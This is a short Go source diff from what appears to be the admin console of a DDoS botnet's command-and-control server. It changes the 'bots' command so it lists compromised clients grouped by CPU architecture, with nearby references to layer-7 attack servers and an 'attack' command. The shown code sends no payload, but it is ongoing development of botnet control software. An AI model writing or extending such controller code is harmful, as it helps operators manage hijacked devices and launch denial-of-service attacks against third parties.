@@ -645,17 +645,28 @@ func AdminSSH(conn net.Conn) {
 			//==============================================================================================================================================================================================================================================================================================================================//
 
 		case "bots":
-			// Non-admins can not see the different types of client sources connected
 			if !session.User.Admin {
 				session.Conn.Write([]byte(fmt.Sprintf("%sTotal%s %s%d%s\r\n", ansiSeparator, ansiReset, ansiNumbers, len(Clients), ansiReset)))
 				continue
 			}
 
-			// Loops through all the access clients
-			for source, amount := range SortClients(make(map[string]int)) {
-				session.Conn.Write([]byte(fmt.Sprintf("%s%s%s: %s%d%s\r\n", ansiPrimary, source, ansiReset, ansiNumbers, amount, ansiReset)))
+			// Agrupar por arquitectura
+			archCount := make(map[string]int)
+			for _, c := range Clients {
+				arch := c.Arch
+				if arch == "" {
+					arch = "unknown"
+				}
+				archCount[arch]++
 			}
 
+			indent := "  " // dos espacios, igual que en ataque
+
+			session.Conn.Write([]byte(indent + ansiSystem + "•" + ansiReset + " " + ansiCommands + "Bots by architecture:" + ansiReset + "\r\n"))
+			for arch, count := range archCount {
+				session.Conn.Write([]byte(indent + ansiSystem + "•" + ansiReset + " " + ansiCommands + arch + ansiReset + ansiSystem + ":" + ansiReset + "\t" + ansiCommands + "[" + strconv.Itoa(count) + "]" + ansiReset + "\r\n"))
+			}
+			session.Conn.Write([]byte(indent + ansiSystem + "•" + ansiReset + " " + ansiCommands + "Total" + ansiReset + ansiSystem + ":" + ansiReset + "\t" + ansiCommands + "[" + strconv.Itoa(len(Clients)) + "]" + ansiReset + "\r\n"))
 			continue
 
 			//Servers L7
